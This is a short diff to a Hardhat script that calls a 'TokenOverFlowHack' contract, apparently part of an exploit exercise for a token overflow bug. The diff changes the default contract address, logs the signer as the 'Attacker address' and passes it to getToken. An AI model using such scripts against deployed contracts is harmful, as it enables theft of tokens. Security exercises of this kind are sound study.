@@ -9,7 +9,7 @@ import { ethers } from "hardhat";
  */
 async function main() {
   // Get contract address from environment variable or use default
-  const defaultAddress = "0x6823aA9C1002F3CF901cd8Df64f9843f2Afba09E";
+  const defaultAddress = "0xD404840fEB422d46BD63Cf2Cd748A488e78Ec390";
   const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
   
   console.log(`Using contract address: ${contractAddress}`);
@@ -22,11 +22,14 @@ async function main() {
   
   console.log(`Connected to TokenOverFlowHack contract at: ${contractAddress}`);
   
+  const [deployer] = await ethers.getSigners();
+  console.log(`Attacker address: ${deployer.address}`);
+
   try {
     // Call the getToken method
     console.log("Executing getToken method...");
     // Use the function interface to avoid TypeScript errors
-    const tx = await tokenOverFlowHack.getFunction("getToken")();
+    const tx = await tokenOverFlowHack.getFunction("getToken")(deployer.address);
     
     // Wait for the transaction to be mined
     console.log("Waiting for transaction to be mined...");
